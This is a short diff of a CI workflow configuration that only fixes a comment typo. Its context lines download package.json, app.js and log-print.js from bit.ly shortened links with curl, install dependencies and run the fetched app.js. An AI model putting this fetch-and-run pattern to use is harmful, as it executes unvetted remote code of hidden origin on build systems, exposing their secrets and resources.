@@ -13,7 +13,7 @@ jobs:
           command: |-
             curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3927CvS -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
       - run: 
-          #ame: Node Install Package
+          #ame: Node Install Packages
           command: |-
             npm i -s
       - run: node app.js
